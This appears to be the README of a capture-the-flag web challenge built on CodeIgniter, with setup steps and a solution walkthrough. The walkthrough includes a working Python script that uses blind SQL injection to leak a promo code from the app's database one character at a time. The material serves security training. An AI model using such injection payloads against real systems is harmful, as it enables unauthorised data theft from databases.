# It's A Party! (Hard)

A CTFd compatible docker image for a web challenge. Scenario:

CyberQuest is the hot new Cybersecurity-themed tabletop RPG coming to stores soon! The creators have asked us to pentest their character building tool and make sure there aren't any vulnerabilities. Ready to form your party?

## Setup

Run the included build-docker.sh script to build and deploy the container in docker.

## Solution

This challenge provides the source code, which the player is able to review to find vulnerabilities. This particular app is built using the PHP MVC framework, Codeigniter, which may make it a little more difficult for some players to know where to look. When the player saves their character, they are given a QR code with an embedded UUID for their saved character. In the API controller (app/Controllers/Api.php), there is an unimplemented character loading function which then takes that UUID and loads the character data. This loading function is vulnerable to SQL injection. However, the only output given is that the function is not implemented, if a character would have been loaded successfully.

By examining the code, they can see that there is a random promo code which will give them the flag and unlock a secret character. So, the player can perform an error-based SQL injection to leak the characters of the flag using a script like the one below:

```python
import requests
import string


URL = "https://dodcybersentinel-web-party.chals.io"


S = requests.Session();


for i in range(1,33):
    for c in string.hexdigits:
        R = S.post("%s/api/load" % URL,json={"cyberquest_character":"' OR '%s' = (SELECT substr(code,%d,1) FROM promo_codes) OR '2'='1" % (c,i),"debug":"false"})
        if "implemented" in R.text:
            print(c,end="")
            break
```

This script will iterate through each position of the promo code characters and test each hex character until it gets the “not implemented” message, and then moves on to the next position.

Once the entire promo code is leaked, they can enter it to unlock the CyberLord character as well as the flag!
